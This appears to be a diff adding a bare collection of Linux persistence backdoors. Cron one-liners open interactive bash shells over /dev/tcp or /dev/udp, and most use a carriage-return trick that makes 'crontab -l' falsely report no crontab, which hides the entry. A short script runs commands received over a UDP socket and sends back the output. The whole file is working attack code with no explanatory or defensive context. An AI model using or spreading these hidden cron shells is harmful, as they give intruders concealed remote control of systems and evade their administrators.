@@ -1,0 +1,21 @@
+crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/localhost/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
+
+crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/localhost/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n"|crontab -
+
+crontab -l;printf "*/60 * * * * exec 9<> /dev/udp/localhost/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
+
+crontab -l;printf "*/3 * * * * $CMD;\rno crontab for $USER%$((${#CMD}+10))c\n" | crontab -
+
+
+#!/bin/bash
+exec 9<> /dev/udp/localhost/8080
+[ $? -eq 1 ] && exit
+echo "connect ok" >&9
+while :
+do
+  a=`dd bs=200 count=1 <&9 2>/dev/null`
+  if echo "$a"|grep "exit"; then break; fi
+  echo `$a` >&9
+done
+exec 9>&-
+exec 9<&-
